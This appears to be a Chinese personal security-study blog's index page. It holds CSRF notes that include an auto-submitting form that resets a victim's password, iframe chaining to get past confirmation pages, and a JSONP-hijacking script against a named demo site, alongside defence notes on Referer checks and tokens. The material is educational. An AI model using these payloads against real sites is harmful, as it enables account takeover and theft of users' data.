<!DOCTYPE html>



  


<html class="theme-next mist use-motion" lang="zh-Hans">
<head>
  <meta charset="UTF-8"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
<meta name="theme-color" content="#222">









<meta http-equiv="Cache-Control" content="no-transform" />
<meta http-equiv="Cache-Control" content="no-siteapp" />
















  
  
  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />







<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />

<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">


  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">


  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">





  <meta name="keywords" content="Hexo, NexT" />










<meta property="og:type" content="website">
<meta property="og:title" content="Tomas&#39;Blog">
<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;index.html">
<meta property="og:site_name" content="Tomas&#39;Blog">
<meta property="og:locale" content="zh-Hans">
<meta name="twitter:card" content="summary">



<script type="text/javascript" id="hexo.configurations">
  var NexT = window.NexT || {};
  var CONFIG = {
    root: '/',
    scheme: 'Mist',
    version: '5.1.4',
    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
    fancybox: true,
    tabs: true,
    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
    duoshuo: {
      userId: '0',
      author: '博主'
    },
    algolia: {
      applicationID: '',
      apiKey: '',
      indexName: '',
      hits: {"per_page":10},
      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
    }
  };
</script>



  <link rel="canonical" href="http://yoursite.com/"/>





  <title>Tomas'Blog</title>
  








</head>

<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">

  
  
    
  

  <div class="container sidebar-position-left 
  page-home">
    <div class="headband"></div>

    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-wrapper">
  <div class="site-meta ">
    

    <div class="custom-logo-site-title">
      <a href="/"  class="brand" rel="start">
        <span class="logo-line-before"><i></i></span>
        <span class="site-title">Tomas'Blog</span>
        <span class="logo-line-after"><i></i></span>
      </a>
    </div>
      
        <p class="site-subtitle"></p>
      
  </div>

  <div class="site-nav-toggle">
    <button>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
      <span class="btn-bar"></span>
    </button>
  </div>
</div>

<nav class="site-nav">
  

  
    <ul id="menu" class="menu">
      
        
        <li class="menu-item menu-item-home">
          <a href="/" rel="section">
            
            首页
          </a>
        </li>
      
        
        <li class="menu-item menu-item-tags">
          <a href="/tags/" rel="section">
            
            标签
          </a>
        </li>
      
        
        <li class="menu-item menu-item-categories">
          <a href="/categories/" rel="section">
            
            分类
          </a>
        </li>
      
        
        <li class="menu-item menu-item-archives">
          <a href="/archives/" rel="section">
            
            归档
          </a>
        </li>
      

      
    </ul>
  

  
</nav>



 </div>
    </header>

    <main id="main" class="main">
      <div class="main-inner">
        <div class="content-wrap">
          <div id="content" class="content">
            
  <section id="posts" class="posts-expand">
    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/20/README/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/02/20/README/" itemprop="url">写在最前</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-20T19:40:17+08:00">
                2020-02-20
              </time>
            

            

            
          </span>

          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  185 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  1 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h1 id="写在最前"><a href="#写在最前" class="headerlink" title="写在最前"></a>写在最前</h1><h3 id="本-README-md-为此博客目录索引"><a href="#本-README-md-为此博客目录索引" class="headerlink" title="本 README.md 为此博客目录索引"></a>本 <strong>README.md</strong> 为此博客目录索引</h3><ul>
<li>Github：<a href="https://github.com/Tomassky" target="_blank" rel="noopener">https://github.com/Tomassky</a></li>
<li>Gmail：<a href="mailto:tomassky7@gamil.com" target="_blank" rel="noopener">tomassky7@gamil.com</a></li>
</ul>
<h2 id="Kali-Linux"><a href="#Kali-Linux" class="headerlink" title="Kali Linux"></a>Kali Linux</h2><ul>
<li><a href="https://tomassky.github.io/categories/Kali/" target="_blank" rel="noopener">Kali Linux笔记</a><ul>
<li><a href="https://www.aqniukt.com/course/83" target="_blank" rel="noopener">此笔记为安全牛苑房宏的Kali渗透测试课程</a></li>
</ul>
</li>
</ul>
<h2 id="Git"><a href="#Git" class="headerlink" title="Git"></a>Git</h2><ul>
<li><a href="https://tomassky.github.io/categories/Git/" target="_blank" rel="noopener">Git笔记</a><ul>
<li><a href="https://www.youtube.com/playlist?list=PLK2w-tGRdrj5jO9Y1k2iAPCw7iSo6YVdx" target="_blank" rel="noopener">此笔记为Youtube代码真香的Git教程</a></li>
</ul>
</li>
</ul>
<h2 id="Penetration-tools"><a href="#Penetration-tools" class="headerlink" title="Penetration tools"></a>Penetration tools</h2><ul>
<li><a href="https://tomassky.github.io/categories/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/" target="_blank" rel="noopener">渗透工具</a> </li>
</ul>
<h2 id="Operating-System"><a href="#Operating-System" class="headerlink" title="Operating System"></a>Operating System</h2><ul>
<li><a href="https://tomassky.github.io/categories/Operating-System/" target="_blank" rel="noopener">操作系统基础</a></li>
</ul>
<h2 id="IPS"><a href="#IPS" class="headerlink" title="IPS"></a>IPS</h2><ul>
<li><a href="https://tomassky.github.io/categories/IPS/" target="_blank" rel="noopener">IPS笔记</a><ul>
<li>此笔记为粤嵌袁盛智老师的IPS教程</li>
</ul>
</li>
</ul>
<h2 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h2><ul>
<li><a href="https://tomassky.github.io/categories/PHP/" target="_blank" rel="noopener">PHP笔记</a><ul>
<li>此笔记为B站黑马程序员的28天PHP零基础入门到精通教程（P1基础6天）</li>
<li>此笔记为传智播客的xindong的PHP基础教程</li>
</ul>
</li>
<li><a href="https://tomassky.github.io/categories/PHP/" target="_blank" rel="noopener">PHP学习</a><ul>
<li>此学习笔记来自各个网站包括PHP官方，PHP中文网，脚本之家</li>
</ul>
</li>
<li><a href="https://tomassky.github.io/categories/PHP/" target="_blank" rel="noopener">PHP实战</a><ul>
<li>此实战为应用所学，进行实践</li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/02/CSRF--%E6%A6%82%E8%A6%81/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/02/CSRF--%E6%A6%82%E8%A6%81/" itemprop="url">CSRF--概要</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-02T16:10:47+08:00">
                2020-04-02
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CSRF/" itemprop="url" rel="index">
                    <span itemprop="name">CSRF</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  1.7k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  6 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h4><ul>
<li>CSRF<ul>
<li>Cross-site request forgery跨站请求伪造，也被称为</li>
<li>“One Click Attack”</li>
<li>Session Riding</li>
<li>通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本（xss），但它与XSS非常不同，并且攻击方式几乎相左。XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。与XSS攻击相比，CSRF攻击往往不太流行（因此对其进行防范的资源也相当稀少）和难以防范，所以被认为比XSS更具危险</li>
</ul>
</li>
<li>CSRF与XSS的区别：CSRF是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而XSS是直接盗取到了用户的权限，然后实施破坏</li>
<li>CSRF与XSS比较的流程<ul>
<li>受害者浏览恶意网站</li>
<li>恶意网站返回恶意HTML</li>
<li>恶意HTML通过受害者的浏览器访问正规网站，作攻击用请求（CSRF）</li>
<li>正规网站攻击用响应内容</li>
<li>受害者的电脑执行改变HTML的脚本（XSS）</li>
<li>▲ CSRF是指恶意使用服务器对步骤三中请求的处理</li>
<li>▲ XSS的情况下，步骤三的请求中包含的脚本则被原封不动地响应四地形式返回，随后该恶意脚本在用户的浏览器中被执行</li>
</ul>
</li>
</ul>
<h4 id="2-手工挖掘"><a href="#2-手工挖掘" class="headerlink" title="2. 手工挖掘"></a>2. 手工挖掘</h4><ul>
<li>一个网站对关键信息（比如密码等敏感信息）的操作(增删改)是否容易被伪造<ul>
<li>修改管理员账号使，不需要验证旧密码</li>
<li>对于敏感信息的修改并没有使用安全的token验证</li>
</ul>
</li>
<li>确认凭证的有效期<ul>
<li>虽然退出或者关闭了浏览器，但cookie仍然有效，或者session没有及时过期</li>
</ul>
</li>
</ul>
<h4 id="3-工具挖掘"><a href="#3-工具挖掘" class="headerlink" title="3. 工具挖掘"></a>3. 工具挖掘</h4><ul>
<li>挖掘工具<ul>
<li>netspark</li>
<li>AWVS</li>
<li>appscan</li>
<li>burp</li>
</ul>
</li>
</ul>
<h4 id="4-漏洞存在的场景"><a href="#4-漏洞存在的场景" class="headerlink" title="4. 漏洞存在的场景"></a>4. 漏洞存在的场景</h4><ul>
<li>产生地点<ul>
<li>仅使用Cookie进行会话管理的网站</li>
<li>仅依靠HTTP认证、SSL客户端证书、手机的移动ID来识别用户的网站</li>
</ul>
</li>
<li>影响范围<ul>
<li>存在CSRF漏洞的页面</li>
</ul>
</li>
<li>影响类型<ul>
<li>以受害用户的权限来执行关键处理。如购买商品、发布帖子、更改密码等</li>
</ul>
</li>
<li>影响程度<ul>
<li>中~大</li>
</ul>
</li>
<li>用户参与程度<ul>
<li>需要 -&gt; 点击恶意链接、浏览恶意网站等</li>
</ul>
</li>
<li>对策概要<ul>
<li>执行关键处理，确认是正规用户发起的请求</li>
</ul>
</li>
<li>具体地点<ul>
<li>咨询内容站点，视频类站点，后台管理系统，企业路由，家用路由，智能家居等的后台系统。WEB邮箱，论坛，留言系统，客户端等等</li>
<li>具有典型的代表有：wordpress、joomla、youtube、twitter、facebook、gmail、yahoo、aol、客户端（telegram、wechat、weibo）等</li>
</ul>
</li>
</ul>
<h4 id="5-“输入-执行”模式的CSRF攻击"><a href="#5-“输入-执行”模式的CSRF攻击" class="headerlink" title="5. “输入-执行”模式的CSRF攻击"></a>5. “输入-执行”模式的CSRF攻击</h4><ul>
<li>使用POST方法请求修改密码的网页</li>
<li>保持网页登陆状态</li>
<li>使用POST参数中来指定新密码</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;body onload=&quot;document.forms[0].submit()&quot;&gt;</span><br><span class="line">&lt;form action=&quot;http://....&quot; method=&quot;POST&quot;&gt;</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;pwd&quot; value=&quot;cracked&quot;&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>流程<ul>
<li>用户登陆example.jp</li>
<li>攻击者设下圈套</li>
<li>受害人浏览恶意网站而触发圈套</li>
<li>攻击者使用恶意网站中的JavaScript，使受害人的浏览器向攻击对象网站发送讲密码变更为cracked的POST请求</li>
<li>密码被修改</li>
</ul>
</li>
<li>iframe结合<ul>
<li>攻击者在实际发动攻击时，为了使攻击显得隐蔽，通常会采用不可见的iframe来布置网页</li>
<li>但会受到同源策略的影响，这时可能需要结合XSS漏洞来实现</li>
</ul>
</li>
</ul>
<h4 id="6-存在确认页面的CSRF攻击"><a href="#6-存在确认页面的CSRF攻击" class="headerlink" title="6. 存在确认页面的CSRF攻击"></a>6. 存在确认页面的CSRF攻击</h4><ul>
<li>输入页面与执行页面之间包含确认页面时的情况</li>
<li>确认页面讲数据传递给执行页面的方法<ul>
<li>使用hidden参数（type属性为hidden的input元素）</li>
<li>使用会话变量</li>
</ul>
</li>
<li>使用hidden参数传递参数<ul>
<li>此模式下的CSRF攻击手段与没有确认页面时的情况相同</li>
<li>多加一个form表单，多加一个点击按钮</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//使用hidden参数传递参数</span><br><span class="line">输入页面：POST</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;mail&quot; value=&quot;foo@example.jp&quot;&gt;</span><br><span class="line"></span><br><span class="line">确认页面：hidden参数</span><br><span class="line">&lt;input type=&quot;hidden&quot; name=&quot;mail&quot; value=&quot;foo@example.jp&quot;&gt;</span><br><span class="line"></span><br><span class="line">执行页面:执行更改成功</span><br></pre></td></tr></table></figure>

<ul>
<li>使用会话变量传递参数<ul>
<li>向确认页面发送POST请求，使邮箱地址保存到会话变量中（iframe1）</li>
<li>伺机打开执行页面（iframe2）</li>
<li>过程：iframe1与恶意网站同时打开，并向确认页面发送含有邮箱地址的POST请求，这样一来邮箱地址就被保存到了会话变量中，在恶意网站打开10秒后，iframe2打开执行页面并完成CSRF攻击。这时，由于邮箱地址已被设置到会话变量中，因此邮箱地址就被更改为了攻击者所指定的邮箱地址，攻击就成功了</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//使用会话变量传递参数</span><br><span class="line">输入页面：POST</span><br><span class="line">&lt;input type=&quot;text&quot; name=&quot;mail&quot; value=&quot;foo@example.jp&quot;&gt;</span><br><span class="line"></span><br><span class="line">确认页面：讲邮箱地址保存至会话变量</span><br><span class="line">$_SESSION[&apos;mail&apos;]=$_POST[&apos;mail&apos;];</span><br><span class="line"></span><br><span class="line">执行界面：从会话变量中获取邮箱地址</span><br><span class="line">$mail=$_SESSION[&apos;mail&apos;];</span><br></pre></td></tr></table></figure>

<ul>
<li>▲ 有些应用采用向导的形式，要经过多个步骤才到达最后的执行页面，这种情况下，只需添加iframe的数量就照样能够实施攻击</li>
<li>▲ 内部网络（局域网）的服务器同样也会成为攻击目标</li>
</ul>
<h4 id="7-JSON劫持"><a href="#7-JSON劫持" class="headerlink" title="7. JSON劫持"></a>7. JSON劫持</h4><ul>
<li>站点：<a href="http://vulnerable.shiyousan.com/Home/GetJson" target="_blank" rel="noopener">http://vulnerable.shiyousan.com/Home/GetJson</a></li>
<li>通过GET请求，就能获得一组敏感的数据</li>
<li>利用<ul>
<li>利用CSRF的方式，恶意诱导人点击</li>
<li>形成JSON敏感信息劫持</li>
</ul>
</li>
<li>▲ JSON劫持本质是CSRF攻击，未对来源进行验证</li>
</ul>
<h4 id="8-JSONP劫持"><a href="#8-JSONP劫持" class="headerlink" title="8. JSONP劫持"></a>8. JSONP劫持</h4><ul>
<li>▲ JSONP劫持其实是跨域版本的JSON劫持</li>
<li>站点：<a href="http://vulnerable.shiyousan.com/Home/GetJson?callback=v" target="_blank" rel="noopener">http://vulnerable.shiyousan.com/Home/GetJson?callback=v</a></li>
<li>通过GET请求，就能获得一组敏感的数据</li>
<li>利用<ul>
<li>利用CSRF的方式，恶意诱导人点击</li>
<li>形成JSON敏感信息劫持</li>
</ul>
</li>
<li>▲ JSONP劫持本质是CSRF攻击，未对来源进行验证</li>
<li>JSONP劫持和JSON的区别<ul>
<li>callback参数，这个是回调参数的命名，需要去首先得知</li>
<li>v值，可以为构造的回调函数，用来接收JSON数据</li>
</ul>
</li>
<li>利用代码</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">function v(result)</span><br><span class="line">&#123;</span><br><span class="line">    alert(result.name);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;http://vulnerable.shiyousan.com/Home/GetJson?callback=v&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<h4 id="9-若要再深入研究CSRF"><a href="#9-若要再深入研究CSRF" class="headerlink" title="9. 若要再深入研究CSRF"></a>9. 若要再深入研究CSRF</h4><ul>
<li>JSON劫持</li>
<li>跨域劫持<ul>
<li>JSONP劫持</li>
<li>Flash劫持</li>
<li>CORS劫持 -&gt; Origin头的无效判断 -&gt; 绕过 -&gt; 请求敏感信息</li>
<li>▲ 跨域劫持的问题，可看云服务器关于跨域的解说</li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/04/02/CSRF--%E9%98%B2%E8%8C%83%E7%AD%96%E7%95%A5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/04/02/CSRF--%E9%98%B2%E8%8C%83%E7%AD%96%E7%95%A5/" itemprop="url">CSRF--防范策略</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-04-02T16:10:47+08:00">
                2020-04-02
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CSRF/" itemprop="url" rel="index">
                    <span itemprop="name">CSRF</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  1.4k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  5 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-对策"><a href="#1-对策" class="headerlink" title="1. 对策"></a>1. 对策</h4><ul>
<li>防御CSRF的关键为确认关键处理的请求确实是由正规用户自愿发送的<ul>
<li>筛选出需要防范CSRF攻击的页面</li>
<li>使代码有能力辨认是否是正规用户的自愿请求</li>
</ul>
</li>
<li>筛选出需要防范CSRF攻击的页面<ul>
<li>在需求分析阶段指定功能一览表，标记出需要执行CSRF防范策略的功能</li>
<li>在概要设计阶段制作页面跳转图，标记出需要执行CSRF防范策略的页面</li>
<li>在开发阶段实施CSRF防范策略</li>
</ul>
</li>
<li>使代码有能力辨认是否是正规用户的自愿请求<ul>
<li>嵌入机密信息（令牌）</li>
<li>再次输入密码</li>
<li>检验Referer</li>
</ul>
</li>
<li>CSRF防范措施的比较</li>
</ul>
<p>|嵌入令牌|再次输入密码|确认Referer<br>:–:|:–:|:–:|:–:<br>开发耗时|中|中|小<br>对用户的影响|无|增加了输入密码的麻烦|关闭了Referer的用户无法正常使用<br>能否用于手机网站|可|可|不可<br>建议使用的地方|最基本的防御策略，所有情况均可使用|需要防范他人伪装或者确认需求很强的页面|用于能够限定用户环境的既有应用的CSRF防范策略</p>
<ul>
<li>辅助策略<ul>
<li>执行完关键操作后，可以向用户注册的邮箱发送有关处理内容的通知邮件</li>
<li>▲ 由于邮件是未经加密的明文传输，因此，最好不要在邮件中添加重要信息，而只是通知用户有人恶意执行了关键处理。而如果用户想要了解详情的话，可以登陆Web应用查看购买力是或发送历史等内容</li>
</ul>
</li>
</ul>
<h4 id="2-验证HTTP-Referer、Origin字段"><a href="#2-验证HTTP-Referer、Origin字段" class="headerlink" title="2. 验证HTTP Referer、Origin字段"></a>2. 验证HTTP Referer、Origin字段</h4><ul>
<li>前提：正规请求与CSRF攻击请求的Referer字段的内容不同，正规请求中Referer的值应该为执行页面的上一个页面（输入页面或确认页面）</li>
<li>检验Referer的方式<ul>
<li>对不发送Referer用户的处理</li>
<li>相对路径要修改为绝对路径URL，包括域名后的/</li>
</ul>
</li>
<li>▲ 通过Referer来防范CSRF漏洞的方法，其适用范围应该被限定在对公司的内部系统等能够限定用户环境的既有应用实施安全隐患对策的情况</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">//没有对不发送Referer用户的处理  -&gt; 关闭Referer无法操作</span><br><span class="line">if(preg_match(&apos;#\Ahttp://example\.jp/xxx\.php#&apos;,@$_SERVER[&apos;HTTP_REFERER&apos;])!==1)&#123;</span><br><span class="line">    die(&apos;请从正规的页面进行操作&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//没有对域名后面的/进行检验  -&gt;  绕过的URL：http://example.jp.trap.example.com/tarp.html</span><br><span class="line">if(preg_match(&apos;#\Ahttp://example\.jp#&apos;,@$_SERVER[&apos;HTTP_REFERER&apos;])!==1)&#123;</span><br><span class="line">    die(&apos;请从正规的页面进行操作&apos;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>通过检测请求报文中的Origin、Referer来判断属于哪一个域名/地址</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// 验证Referer字段</span><br><span class="line">if($_GET[&quot;act&quot;]) </span><br><span class="line">&#123; </span><br><span class="line">if(isset($_SERVER[&quot;HTTP_REFERER&quot;])) </span><br><span class="line">&#123; </span><br><span class="line">$serverhost = $_SERVER[&quot;SERVER_NAME&quot;]; </span><br><span class="line">$strurl = str_replace(&quot;http://&quot;,&quot;&quot;,$_SERVER[&quot;HTTP_REFERER&quot;]); </span><br><span class="line">$strdomain = explode(&quot;/&quot;,$strurl); </span><br><span class="line">$sourcehost = $strdomain[0]; </span><br><span class="line">if(strncmp($sourcehost, $serverhost, strlen($serverhost))) </span><br><span class="line">&#123;</span><br><span class="line">unset($_POST); </span><br><span class="line">echo &quot;&quot;; </span><br><span class="line">echo &quot;alert(‘数据来源异常!’);&quot;; </span><br><span class="line">echo &quot; location=’index.php’;&quot;;</span><br><span class="line">echo &quot;&quot;; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="3-在请求地址中添加-token-并验证"><a href="#3-在请求地址中添加-token-并验证" class="headerlink" title="3. 在请求地址中添加 token 并验证"></a>3. 在请求地址中添加 token 并验证</h4><ul>
<li>对关键操作增加token参数，token值必须随机，每次都不一样</li>
<li>如果访问需防范CSRF的页面（登陆页面、订单确认页面等）时需要提供第三方无法得知的机密信息的话，那么即使出现非正规用户自愿发送的请求，应用端也能够通过判断得知请求是否合法，用于此目的的机密信息被成为Token</li>
<li>接收令牌的请求（接收关键处理的请求）必须为POST方法。若使用GET方法发送机密信息的话，令牌信息就有可能通过Referer泄露出去</li>
<li>▲ 会话ID是一种既简单又安全的令牌的实现方法</li>
<li>一次性令牌<ul>
<li>用于防范重放攻击（Replay Attack）</li>
<li>需要密码学级别的伪随机数生成器</li>
</ul>
</li>
</ul>
<h4 id="4-在HTTP头中自定义属性并验证"><a href="#4-在HTTP头中自定义属性并验证" class="headerlink" title="4. 在HTTP头中自定义属性并验证"></a>4. 在HTTP头中自定义属性并验证</h4><ul>
<li>把token以参数的形式置于HTTP请求之中，而是把它放到HTTP头中自定义的属性里</li>
<li>过 XMLHttpRequest这个类，可以一次性给所有该类请求加上csrftoken这个HTTP头属性，并把token值放入其中</li>
<li>优点：XMLHttpRequest请求的地址不会被记录到浏览器的地址栏，token不会透过Referer泄露到其他网站中去</li>
<li>缺点：XMLHttpRequest请求通常用于Ajax方法中对于页面局部的异步刷新，并非所有的请求都适合用这个类来发起，且重构网站，代价很大</li>
</ul>
<h4 id="5-对敏感信息的操作实施安全的逻辑流程"><a href="#5-对敏感信息的操作实施安全的逻辑流程" class="headerlink" title="5. 对敏感信息的操作实施安全的逻辑流程"></a>5. 对敏感信息的操作实施安全的逻辑流程</h4><ul>
<li>修改密码时，需要先校验旧密码</li>
<li>敏感信息的修改使用post，而不是get</li>
<li>一般在登录时候，也可以在其他重要信息操作的表单&lt;要考虑到可用性&gt;  </li>
</ul>
<h4 id="6-安全的会话管理，避免会话被利用"><a href="#6-安全的会话管理，避免会话被利用" class="headerlink" title="6. 安全的会话管理，避免会话被利用"></a>6. 安全的会话管理，避免会话被利用</h4><ul>
<li>不在客户端保存敏感信息，比如身份认证信息</li>
<li>测试直接关闭</li>
<li>设置会话过期机制，比如15分钟内无操作，则自动登录超时</li>
</ul>
